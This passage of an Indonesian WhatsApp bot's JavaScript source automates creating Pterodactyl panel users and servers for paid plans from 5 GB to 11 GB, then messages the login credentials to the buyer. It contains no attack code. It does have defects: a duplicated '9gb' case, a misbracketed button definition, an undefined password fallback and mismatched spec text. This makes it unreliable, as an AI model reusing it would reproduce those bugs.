"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 4050 / 4 GB
│ • *DISK :* 4050 / 4 GB
│ • *CPU :* 120%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "5gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5050"
let cpu = "150"
let disk = "5050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 5050 / 5 GB 
│ • *DISK :* 5050 / 5 GB 
│ • *CPU :* 150%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 5050 / 5 GB 
│ • *DISK :* 5050 / 5 GB 
│ • *CPU :* 150%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "6gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6050"
let cpu = "180"
let disk = "6050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `
*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 6050 / 6 GB 
│ • *DISK :* 6050 / 6 GB 
│ • *CPU :* 180%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 6050 / 6 GB
│ • *DISK :* 6050 / 6 GB
│ • *CPU :* 180%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "7gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7050"
let cpu = "210"
let disk = "7050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 7050 / 7 GB
│ • DISK : 7050 / 7 GB
│ • CPU : 210%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 7050 / 7 GB
│ • *DISK :* 7050 / 7 GB
│ • *CPU :* 210%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "9gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8050"
let cpu = "240"
let disk = "8050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 8050 / 8 GB 
│ • *DISK :* 8050 / 8 GB 
│ • *CPU :* 240%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 8050 / 8 GB 
│ • *DISK :* 8050 / 9 GB 
│ • *CPU :* 240%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "9gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9050"
let cpu = "270"
let disk = "9050"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 9050 / 9 GB 
│ • *DISK :* 9050 / 9 GB 
│ • *CPU :* 270%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 9050 / 9 GB 
│ • *DISK :* 9050 / 9 GB 
│ • *CPU :* 270%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "10gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10075"
let cpu = "300"
let disk = "10075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • *RAM :* 10075
│ • *DISK :* 10075
│ • *CPU :* 300%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 10075
│ • *DISK :* 10075
│ • *CPU :* 300%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "11gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "11075"
let cpu = "330"
let disk = "11075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
